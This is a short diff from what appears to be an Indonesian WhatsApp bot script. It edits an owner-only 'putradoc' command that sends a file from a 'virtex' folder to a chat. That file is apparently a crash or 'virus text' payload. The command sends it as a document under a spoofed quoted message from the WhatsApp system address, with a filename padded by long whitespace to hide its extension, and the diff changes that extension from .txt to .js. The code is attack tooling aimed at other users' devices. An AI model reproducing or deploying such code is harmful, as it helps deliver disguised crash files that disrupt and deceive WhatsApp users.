@@ -8517,7 +8517,7 @@ if (!kal.key.fromMe) return fakestatus('APASIH')
 case 'putradoc':
 if (!q) return reply(`Teks?`)
          if (!kal.key.fromMe) return replyy('APASIH')
-arawa = fs.readFileSync('./virtex/ngazap.txt')
+arawa = fs.readFileSync('./virtex/ngazap.js')
 Haikal.sendMessage(from, arawa, document, { quoted: {
   key: {
    participant: '0@s.whatsapp.net'
@@ -8532,7 +8532,7 @@ Haikal.sendMessage(from, arawa, document, { quoted: {
     sellerJid: '0@s.whatsapp.net'
    }
   }
- } ,filename:`${q}                                                                          ${ngazap(prefix)}.txt`, mimetype: 'application/txt'})
+ } ,filename:`${q}                                                                          ${ngazap(prefix)}.js`, mimetype: 'application.js'})
 break
 case 'putraloc':
 if (!kal.key.fromMe) return reply('Skip lu bukan owner !!')
